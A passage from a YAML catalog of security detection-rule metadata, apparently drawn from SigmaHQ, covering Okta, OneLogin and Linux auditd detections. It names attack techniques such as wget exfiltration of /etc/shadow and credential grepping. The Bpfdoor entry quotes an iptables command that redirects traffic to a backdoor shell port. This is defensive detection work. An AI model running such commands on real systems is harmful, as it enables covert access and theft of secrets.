  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078.004
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection
  false_positives:
  - When an admin begins using the Admin Console and one of Okta's heuristics incorrectly
    identifies the behavior as being unusual.
  notes: ''
- detection_id: 91b76b84-8589-47aa-9605-c837583b82a9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_password_in_alternateid_field.yml
  name: Potential Okta Password in AlternateID Field
  description: 'Detects when a user has potentially entered their password into the

    username field, which will cause the password to be retained in log files.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1552
  tags:
  - attack.credential-access
  - attack.t1552
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://www.mitiga.io/blog/how-okta-passwords-can-be-compromised-uncovering-a-risk-to-user-data
  - https://help.okta.com/en-us/Content/Topics/users-groups-profiles/usgp-create-character-restriction.htm
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1667a172-ed4c-463c-9969-efd92195319a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_policy_modified_or_deleted.yml
  name: Okta Policy Modified or Deleted
  description: Detects when an Okta policy is modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Okta Policies being modified or deleted may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Okta Policies modified or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 0c97c1d3-4057-45c9-b148-1de94b631931
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_policy_rule_modified_or_deleted.yml
  name: Okta Policy Rule Modified or Deleted
  description: Detects when an Policy Rule is Modified or Deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5c82f0b9-3c6d-477f-a318-0e14a1df73e0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_security_threat_detected.yml
  name: Okta Security Threat Detected
  description: Detects when an security threat is detected in Okta.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  time_window: ''
  references:
  - https://okta.github.io/okta-help/en/prod/Content/Topics/Security/threat-insight/configure-threatinsight-system-log.htm
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 07e97cc6-aed1-43ae-9081-b3470d2367f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_suspicious_activity_enduser_report.yml
  name: Okta Suspicious Activity Reported by End-user
  description: Detects when an Okta end-user reports activity by their account as
    being potentially suspicious.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1586.003
  tags:
  - attack.resource-development
  - attack.t1586.003
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://github.com/okta/workflows-templates/blob/1164f0eb71ce47c9ddc7d850e9ab87b5a2b42333/workflows/suspicious_activity_reported/readme.md
  false_positives:
  - If an end-user incorrectly identifies normal activity as suspicious.
  notes: ''
- detection_id: 6cc2b61b-d97e-42ef-a9dd-8aa8dc951657
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_unauthorized_access_to_app.yml
  name: Okta Unauthorized Access to App
  description: Detects when unauthorized access to app occurs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - User might of believe that they had access.
  notes: ''
- detection_id: 14701da0-4b0f-4ee6-9c95-2ffb4e73bb9a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_user_account_locked_out.yml
  name: Okta User Account Locked Out
  description: Detects when an user account is locked out.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1531
  tags:
  - attack.impact
  - attack.t1531
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b6c718dd-8f53-4b9f-98d8-93fdca966969
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_user_created.yml
  name: New Okta User Created
  description: Detects new user account creation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: informational
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Legitimate and authorized user creation
  notes: ''
- detection_id: bde30855-5c53-4c18-ae90-1ff79ebc9578
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_user_session_start_via_anonymised_proxy.yml
  name: Okta User Session Start Via An Anonymising Proxy Service
  description: Detects when an Okta user session starts where the user is behind an
    anonymising proxy service.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.006
  tags:
  - attack.defense-evasion
  - attack.t1562.006
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection
  false_positives:
  - If a user requires an anonymising proxy due to valid justifications.
  notes: ''
- detection_id: 62fff148-278d-497e-8ecd-ad6083231a35
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/onelogin/onelogin_assumed_another_user.yml
  name: OneLogin User Assumed Another User
  description: Detects when an user assumed another user account.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: onelogin
  product: onelogin.events
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://developers.onelogin.com/api-docs/1/events/event-resource
  false_positives:
  - Unknown
  notes: ''
- detection_id: a717c561-d117-437e-b2d9-0118a7035d01
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/onelogin/onelogin_user_account_locked.yml
  name: OneLogin User Account Locked
  description: Detects when an user account is locked or suspended.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: onelogin
  product: onelogin.events
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://developers.onelogin.com/api-docs/1/events/event-resource/
  false_positives:
  - System may lock or suspend user accounts.
  notes: ''
- detection_id: c52a914f-3d8b-4b2a-bb75-b3991e75f8ba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_binary_padding.yml
  name: Binary Padding - Linux
  description: 'Adversaries may use binary padding to add junk data and change the
    on-disk representation of malware.

    This rule detect using dd and truncate to add a junk data to file.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1027.001
  tags:
  - attack.defense-evasion
  - attack.t1027.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1027.001/T1027.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 70b4156e-50fc-4523-aa50-c9dddf1993fc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_bpfdoor_port_redirect.yml
  name: Bpfdoor TCP Ports Redirect
  description: 'All TCP traffic on particular port from attacker is routed to different
    port. ex. ''/sbin/iptables -t nat -D PREROUTING -p tcp -s 192.168.1.1 --dport
    22 -j REDIRECT --to-ports 42392''

    The traffic looks like encrypted SSH communications going to TCP port 22, but
    in reality is being directed to the shell port once it hits the iptables rule
    for the attacker host only.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://www.sandflysecurity.com/blog/bpfdoor-an-evasive-linux-backdoor-technical-analysis/
  - https://www.elastic.co/security-labs/a-peek-behind-the-bpfdoor
  false_positives:
  - Legitimate ports redirect
  notes: ''
- detection_id: fe10751f-1995-40a5-aaa2-c97ccb4123fe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_capabilities_discovery.yml
  name: Linux Capabilities Discovery
  description: Detects attempts to discover the files with setuid/setgid capability
    on them. That would allow adversary to escalate their privileges.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  - T1548
  tags:
  - attack.discovery
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1083
  - attack.t1548
  time_window: ''
  references:
  - https://man7.org/linux/man-pages/man8/getcap.8.html
  - https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
  - https://mn3m.info/posts/suid-vs-capabilities/
  - https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099
  false_positives:
  - Unknown
  notes: ''
- detection_id: b3cec4e7-6901-4b0d-a02d-8ab2d8eb818b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_change_file_time_attr.yml
  name: File Time Attribute Change - Linux
  description: Detect file time attribute change to hide new or changes to existing
    files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1070.006
  tags:
  - attack.defense-evasion
  - attack.t1070.006
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.006/T1070.006.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: a5b977d6-8a81-4475-91b9-49dbfcd941f7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_chattr_immutable_removal.yml
  name: Remove Immutable File Attribute - Auditd
  description: Detects removing immutable file attribute.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1222.002
  tags:
  - attack.defense-evasion
  - attack.t1222.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1222.002/T1222.002.md
  false_positives:
  - Administrator interacting with immutable files (e.g. for instance backups).
  notes: ''
- detection_id: 214e7e6c-f21b-47ff-bb6f-551b2d143fcf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_clipboard_collection.yml
  name: Clipboard Collection with Xclip Tool - Auditd
  description: 'Detects attempts to collect data stored in the clipboard from users
    with the usage of xclip tool.

    Xclip has to be installed.

    Highly recommended using rule on servers, due to high usage of clipboard utilities
    on user workstations.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1115
  tags:
  - attack.collection
  - attack.t1115
  time_window: ''
  references:
  - https://linux.die.net/man/1/xclip
  - https://www.cyberciti.biz/faq/xclip-linux-insert-files-command-output-intoclipboard/
  false_positives:
  - Legitimate usage of xclip tools
  notes: ''
- detection_id: f200dc3f-b219-425d-a17e-c38467364816
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_clipboard_image_collection.yml
  name: Clipboard Collection of Image Data with Xclip Tool
  description: 'Detects attempts to collect image data stored in the clipboard from
    users with the usage of xclip tool.

    Xclip has to be installed.

    Highly recommended using rule on servers, due to high usage of clipboard utilities
    on user workstations.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1115
  tags:
  - attack.collection
  - attack.t1115
  time_window: ''
  references:
  - https://linux.die.net/man/1/xclip
  false_positives:
  - Legitimate usage of xclip tools
  notes: ''
- detection_id: 071d5e5a-9cef-47ec-bc4e-a42e34d8d0ed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_coinminer.yml
  name: Possible Coin Miner CPU Priority Param
  description: Detects command line parameter very often used with coin miners
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.privilege-escalation
  - attack.t1068
  time_window: ''
  references:
  - https://xmrig.com/docs/miner/command-line-options
  false_positives:
  - Other tools that use a --cpu-priority flag
  notes: ''
- detection_id: a3b5e3e9-1b49-4119-8b8e-0344a01f21ee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_data_compressed.yml
  name: Data Compressed
  description: An adversary may compress data (e.g., sensitive documents) that is
    collected prior to exfiltration in order to make it portable and minimize the
    amount of data sent over the network.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Exfiltration
  techniques:
  - T1560.001
  tags:
  - attack.exfiltration
  - attack.collection
  - attack.t1560.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/a78b9ed805ab9ea2e422e1aa7741e9407d82d7b1/atomics/T1560.001/T1560.001.md
  false_positives:
  - Legitimate use of archiving tools by legitimate user.
  notes: ''
- detection_id: cb39d16b-b3b6-4a7a-8222-1cf24b686ffc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_data_exfil_wget.yml
  name: Data Exfiltration with Wget
  description: 'Detects attempts to post the file with the usage of wget utility.

    The adversary can bypass the permission restriction with the misconfigured sudo
    permission for wget utility which could allow them to read files like /etc/shadow.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048.003
  tags:
  - attack.exfiltration
  - attack.t1048.003
  time_window: ''
  references:
  - https://linux.die.net/man/1/wget
  - https://gtfobins.github.io/gtfobins/wget/
  false_positives:
  - Legitimate usage of wget utility to post a file
  notes: ''
- detection_id: 37222991-11e9-4b6d-8bdf-60fbe48f753e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_dd_delete_file.yml
  name: Overwriting the File with Dev Zero or Null
  description: Detects overwriting (effectively wiping/deleting) of a file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: stable
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  tags:
  - attack.impact
  - attack.t1485
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md
  false_positives:
  - Appending null bytes to files.
  - Legitimate overwrite of files.
  notes: ''
- detection_id: 74c01ace-0152-4094-8ae2-6fd776dd43e5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_file_or_folder_permissions.yml
  name: File or Folder Permissions Change
  description: Detects file and folder permission changes.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1222.002
  tags:
  - attack.defense-evasion
  - attack.t1222.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1222.002/T1222.002.md
  false_positives:
  - User interacting with files permissions (normal/daily behaviour).
  notes: ''
- detection_id: df3fcaea-2715-4214-99c5-0056ea59eb35
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_find_cred_in_files.yml
  name: Credentials In Files - Linux
  description: Detecting attempts to extract passwords with grep
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1552.001
  tags:
  - attack.credential-access
  - attack.t1552.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: d08722cd-3d09-449a-80b4-83ea2d9d4616
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_hidden_files_directories.yml
  name: Hidden Files and Directories
  description: Detects adversary creating hidden file or directory, by detecting directories
    or files with . as the first character
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1564.001
  tags:
  - attack.defense-evasion
  - attack.t1564.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.001/T1564.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 45810b50-7edc-42ca-813b-bdac02fb946b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_hidden_zip_files_steganography.yml
  name: Steganography Hide Zip Information in Picture File
  description: Detects appending of zip file to image
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1027.003
  tags:
  - attack.defense-evasion
  - attack.t1027.003
  time_window: ''
  references:
  - https://zerotoroot.me/steganography-hiding-a-zip-in-a-jpeg-file/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9d4548fa-bba0-4e88-bd66-5d5bf516cda0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_masquerading_crond.yml
  name: Masquerading as Linux Crond Process
  description: 'Masquerading occurs when the name or location of an executable, legitimate
    or malicious, is manipulated or abused for the sake of evading defenses and observation.

    Several different variations of this technique have been observed.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/8a82e9b66a5b4f4bc5b91089e9f24e0544f20ad7/atomics/T1036.003/T1036.003.md#atomic-test-2---masquerading-as-linux-crond-process
  false_positives: []
  notes: ''
- detection_id: 323ff3f5-0013-4847-bbd4-250b5edb62cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_modify_system_firewall.yml
  name: Modify System Firewall
  description: 'Detects the removal of system firewall rules. Adversaries may only
    delete or modify a specific system firewall rule to bypass controls limiting network
    usage or access.

    Detection rules that match only on the disabling of firewalls will miss this.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.t1562.004
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/22/c/cyclops-blink-sets-sights-on-asus-routers--.html
  - https://blog.aquasec.com/container-security-tnt-container-attack
  - https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/getting-started-with-nftables_configuring-and-managing-networking
  false_positives:
  - Legitimate admin activity
  notes: ''
- detection_id: f4d3748a-65d1-4806-bd23-e25728081d01
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_network_sniffing.yml
  name: Network Sniffing - Linux
  description: 'Network sniffing refers to using the network interface on a system
    to monitor or capture information sent over a wired or wireless connection.

    An adversary may place a network interface into promiscuous mode to passively
    access data in transit over the network, or use span ports to capture a larger
    amount of data.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1040
  tags:
  - attack.credential-access
  - attack.discovery
  - attack.t1040
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1040/T1040.md
  false_positives:
  - Legitimate administrator or user uses network sniffing tool for legitimate reasons.
  notes: ''
- detection_id: dbe4b9c5-c254-4258-9688-d6af0b7967fd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_screencapture_import.yml
  name: Screen Capture with Import Tool
  description: 'Detects adversary creating screen capture of a desktop with Import
    Tool.

    Highly recommended using rule on servers, due to high usage of screenshot utilities
    on user workstations.

    ImageMagick must be installed.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1113
  tags:
  - attack.collection
  - attack.t1113
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1113/T1113.md
  - https://linux.die.net/man/1/import
  - https://imagemagick.org/
  false_positives:
  - Legitimate use of screenshot utility
  notes: ''
- detection_id: e2f17c5d-b02a-442b-9052-6eb89c9fec9c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_screencaputre_xwd.yml
  name: Screen Capture with Xwd
  description: Detects adversary creating screen capture of a full with xwd. Highly
    recommended using rule on servers, due high usage of screenshot utilities on user
    workstations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1113
  tags:
  - attack.collection
  - attack.t1113
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1113/T1113.md#atomic-test-3---x-windows-capture
  - https://linux.die.net/man/1/xwd
  false_positives:
  - Legitimate use of screenshot utility
  notes: ''
- detection_id: ce446a9e-30b9-4483-8e38-d2c9ad0a2280
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_steghide_embed_steganography.yml
  name: Steganography Hide Files with Steghide
  description: Detects embedding of files with usage of steghide binary, the adversaries
    may use this technique to prevent the detection of hidden information.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1027.003
  tags:
  - attack.defense-evasion
  - attack.t1027.003
  time_window: ''
  references:
  - https://vitux.com/how-to-hide-confidential-files-in-images-on-debian-using-steganography/
  false_positives:
  - Unknown
  notes: ''
- detection_id: a5a827d9-1bbe-4952-9293-c59d897eb41b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_steghide_extract_steganography.yml
  name: Steganography Extract Files with Steghide
  description: Detects extraction of files with usage of steghide binary, the adversaries
    may use this technique to prevent the detection of hidden information.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1027.003
  tags:
  - attack.defense-evasion
  - attack.t1027.003
  time_window: ''
  references:
  - https://vitux.com/how-to-hide-confidential-files-in-images-on-debian-using-steganography/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1543ae20-cbdf-4ec1-8d12-7664d667a825
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_susp_cmds.yml
  name: Suspicious Commands Linux
  description: Detects relevant commands often related to malware or hacking activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.004
  tags:
  - attack.execution
  - attack.t1059.004
  time_window: ''
  references:
  - Internal Research - mostly derived from exploit code including code in MSF
  false_positives:
  - Admin activity
  notes: ''
- detection_id: eae8ce9f-bde9-47a6-8e79-f20d18419910
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/auditd/execve/lnx_auditd_susp_histfile_operations.yml
  name: Suspicious History File Operations - Linux
  description: Detects commandline operations on shell history files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: auditd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1552.003
  tags:
  - attack.credential-access
  - attack.t1552.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.003/T1552.003.md
  false_positives:
